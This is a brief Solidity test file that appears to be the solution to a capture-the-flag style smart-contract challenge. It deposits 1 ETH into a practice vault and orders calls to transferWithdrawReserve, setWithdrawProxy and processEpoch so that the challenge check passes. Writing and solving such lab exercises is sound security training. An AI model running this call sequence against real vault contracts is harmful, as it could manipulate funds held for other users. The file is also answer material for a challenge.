// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleVaultBaseTest.t.sol";

contract SimpleVaultTest is SimpleVaultBaseTest {
    function test_write_here() public checkChallengeSolved {
        /*  write here  */
        // Put 1 ETH into the vault during a new epoch.
        uint256 amount = 1 ether;
        vault.transferWithdrawReserve();
        vault.setWithdrawProxy(0, proxy1);
        vault.processEpoch();
        (bool success, ) = address(vault).call{value: amount}("");
        require(success, "Call failed");
        vault.setWithdrawProxy(1, proxy2);
        vault.transferWithdrawReserve();
    }
}
